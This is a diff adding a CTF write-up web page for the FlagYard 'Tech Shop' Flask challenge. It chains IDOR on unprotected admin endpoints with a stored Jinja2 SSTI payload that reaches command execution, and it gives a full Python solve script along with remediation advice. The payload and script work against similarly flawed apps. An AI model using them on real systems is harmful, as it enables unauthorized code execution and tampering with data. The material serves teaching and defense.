@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080706">
+  <meta name="description" content="Broken access control lets any user rewrite a product&#x27;s description and top up their balance — then a second, unsafe render of that description in the order-history page turns it into Jinja2 SSTI and RCE.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="0xAdham Field Notes">
+  <meta property="og:title" content="FlagYard — Tech Shop · 0xAdham">
+  <meta property="og:description" content="Broken access control lets any user rewrite a product&#x27;s description and top up their balance — then a second, unsafe render of that description in the order-history page turns it into Jinja2 SSTI and RCE.">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>FlagYard — Tech Shop · 0xAdham</title>
+  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
+  <link rel="stylesheet" href="/assets/site.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
+        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
+        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
+      </a>
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
+      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
+        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="wrap article-header">
+      <div class="eyebrow"><span class="index">FIELD NOTE</span> CTF</div>
+      <h1 class="page-title">FlagYard — Tech Shop</h1>
+      <div class="article-byline">
+        <span>By Adham Mohammed / 0xAdham</span>
+        <span>2026-07-23</span>
+        <span>CTF · Web security research</span>
+      </div>
+    </div>
+    <section class="section">
+      <div class="wrap content-layout">
+        <article class="prose">
+          <p><strong>Tech Shop</strong> is a Flask "e-commerce" app (products, cart, balance, order history). It hands you an obvious IDOR and an obvious SSTI attempt that <em>looks</em> like a dead end. The trick is that the same user-controlled field is rendered in two different places — one safe, one not.</p>
+<h2>The Setup</h2>
+<p>The <code>/shop</code> page ships a JS comment block that basically hands you the internal API:</p>
+<pre><code class="language-javascript">const internalEndpoints = {
+    // Admin endpoints
+    updateBalance: '/update_balance/&lt;user_id&gt;', // POST balance=&lt;amount&gt;
+    editProduct:   '/edit_product/&lt;product_id&gt;' // POST description=&lt;text&gt;
+};
+</code></pre>
+<p>Both are labelled "admin only". Neither actually checks your role.</p>
+<h2>Step 1 — Broken Access Control (IDOR)</h2>
+<p>Logged in as a normal user, both endpoints work and just trust the path parameter:</p>
+<pre><code>POST /edit_product/7      description=hello      → 302, product 7's description changes
+POST /update_balance/&lt;me&gt; balance=1000000        → 302, my balance becomes $1,000,000
+</code></pre>
+<p>No privilege check anywhere. That's the enabler — but on its own it's just "vandalise a product / give yourself money".</p>
+<h2>Step 2 — The SSTI That Looks Dead</h2>
+<p>The natural next move is template injection through the description. On <code>/shop</code> it flatly refuses:</p>
+<pre><code class="language-html">&lt;p class=&quot;card-text&quot;&gt;{{7*7}}&lt;/p&gt;
+</code></pre>
+<p><code>{{7*7}}</code> renders <strong>literally</strong>. The product listing uses <code>{{ product.description }}</code> with normal autoescaping (<code>render_template</code>) — not a template-injection sink. Easy to conclude SSTI is off the table here. It isn't.</p>
+<h2>Step 3 — Find the Second Render</h2>
+<p>Enumerating the app turns up <code>/profile/&lt;id&gt;</code>. Most profiles are ~2 KB; the seeded admin's profile is ~8.8 KB because it renders an <strong>Order History</strong> table — and each row echoes the purchased product's description again:</p>
+<pre><code class="language-html">&lt;td&gt;
+    Gaming Laptop
+    &lt;small class=&quot;text-muted d-block&quot;&gt;
+        High-performance gaming laptop   &lt;!-- product.description, rendered a SECOND time --&gt;
+    &lt;/small&gt;
+&lt;/td&gt;
+</code></pre>
+<p>Same field, second render point. If this one interpolates through <code>render_template_string</code>, it's injectable even though <code>/shop</code> isn't.</p>
+<h2>Step 4 — Chain It</h2>
+<p>To get my own tainted description into <em>my</em> order history:</p>
+<ol>
+<li><code>POST /edit_product/7</code> <code>description={{7*7}}</code> — plant the payload (IDOR).</li>
+<li><code>POST /update_balance/&lt;me&gt;</code> <code>balance=1000000</code> — afford checkout (IDOR).</li>
+<li><code>GET /add_to_cart/7</code> → <code>GET /checkout</code> — buy it, snapshotting the product into my orders.</li>
+<li><code>GET /profile/&lt;me&gt;</code> — the order-history table re-renders the description.</li>
+</ol>
+<p>The <code>&lt;small&gt;</code> block came back as:</p>
+<pre><code>49
+</code></pre>
+<p><code>{{7*7}}</code> evaluated. SSTI confirmed on the profile sink.</p>
+<h2>Step 5 — SSTI to RCE</h2>
+<p>The Jinja2 context isn't sandboxed, so a compact global-walk gadget gets command execution. Set the description to:</p>
+<pre><code class="language-jinja2">{{ cycler.__init__.__globals__.os.popen('id; env | grep -i flag').read() }}
+</code></pre>
+<p>Buy again, reload the profile, and the order-history row renders:</p>
+<pre><code>uid=1000 gid=1000 groups=1000
+DYN_FLAG=FlagY{...}
+</code></pre>
+<p>The flag isn't on disk (<code>cat /flag*</code> finds nothing) — it's injected as the <code>DYN_FLAG</code> environment variable, so <code>env</code> pulls it.</p>
+<h2>Flag</h2>
+<pre><code>FlagY{...}
+</code></pre>
+<h2>Full Solve Script</h2>
+<pre><code class="language-python">import requests, re, random
+B = &quot;http://&lt;instance&gt;.playat.flagyard.com&quot;   # HTTP :80 — NOT https (443 black-holes)
+s = requests.Session()
+u, p = &quot;pwn%d&quot; % random.randint(1000, 9999), &quot;pwn12345&quot;
+s.post(B + &quot;/register&quot;, data={&quot;username&quot;: u, &quot;password&quot;: p})
+s.post(B + &quot;/login&quot;,    data={&quot;username&quot;: u, &quot;password&quot;: p})
+myid = re.search(r'profile/(\d+)', s.get(B + &quot;/shop&quot;).text).group(1)
+
+# IDOR: fund the account + plant the SSTI payload in a product's description
+s.post(B + &quot;/update_balance/&quot; + myid, data={&quot;balance&quot;: &quot;1000000&quot;})
+payload = &quot;{{ cycler.__init__.__globals__.os.popen('env | grep -i flag').read() }}&quot;
+s.post(B + &quot;/edit_product/7&quot;, data={&quot;description&quot;: payload})
+
+# Buy it -&gt; snapshots into order history -&gt; triggers render_template_string
+s.get(B + &quot;/add_to_cart/7&quot;)
+s.get(B + &quot;/checkout&quot;)
+print(s.get(B + &quot;/profile/&quot; + myid).text[…])   # flag appears in the order-history &lt;small&gt; block
+</code></pre>
+<h2>Why It Works</h2>
+<p>The same stored value hits two sinks with different safety. <code>/shop</code> uses <code>{{ product.description }}</code> under autoescaping, so injection is inert. The profile's order-history template builds its output with <code>render_template_string</code>, so the <em>stored</em> description is parsed as a Jinja2 template every time the page loads. IDOR gives write access to that stored value; the second render turns it into code execution.</p>
+<h2>What I Did Wrong</h2>
+<ul>
+<li>Spent time convinced my tooling was broken when <code>https://</code> requests hung. The instance only listens on <strong>HTTP :80</strong> — 443 just times out. One TCP connect per port would have caught it immediately.</li>
+<li>Nearly wrote SSTI off after <code>/shop</code> rendered <code>{{7*7}}</code> literally, instead of asking <em>where else</em> the same field is displayed.</li>
+</ul>
+<h2>What I Learned</h2>
+<ul>
+<li>When one render point escapes your payload, hunt for a <strong>second</strong> place the same data is shown before abandoning the bug class. Order-history / receipt / invoice pages are classic unsafe re-render sinks.</li>
+<li>IDOR is often the enabler, not the finish line — here it only mattered because it fed a second, unsafe render.</li>
+<li>Flags aren't always files. Always dump <code>env</code> alongside <code>cat /flag*</code>.</li>
+<li><code>cycler.__init__.__globals__.os</code> is a tidy Jinja2 RCE gadget when the <code>cycler</code>/<code>joiner</code>/<code>namespace</code> globals are in scope — no <code>__subclasses__()</code> walking needed.</li>
+</ul>
+<h2>The Fix</h2>
+<ul>
+<li>Enforce authorization server-side on <code>/edit_product</code> and <code>/update_balance</code> (check the session's role, don't trust the path parameter).</li>
+<li>Never feed stored user input to <code>render_template_string</code>. Render with <code>render_template</code> and pass the value as a context variable so it's autoescaped like every other field.</li>
+</ul>
+<p><em>0xAdham</em></p>
+        </article>
+        <aside class="article-aside">
+          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
+          <h2>Clear. Scoped. Reproducible.</h2>
+          <p>Broken access control lets any user rewrite a product&#x27;s description and top up their balance — then a second, unsafe render of that description in the order-history page turns it into Jinja2 SSTI and RCE.</p>
+          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
+            <div><strong style="color:var(--ink)">Published:</strong> 2026-07-23</div>
+            <div><strong style="color:var(--ink)">Category:</strong> CTF</div>
+            <div style="margin-top:10px"><strong style="color:var(--ink)">Tags:</strong><div style="margin-top:5px"><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">ctf</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">web</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">flagyard</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">idor</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">ssti</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">jinja2</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">rce</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">flask</span></div></div>
+          </div>
+          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
+        </aside>
+      </div>
+    </section>
+  </main>
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="footer-bottom">
+        <span>© 2026 · 0xAdham</span>
+        <a href="/writing/">Return to writing ↑</a>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/site.js" defer></script>
+</body>
+</html>
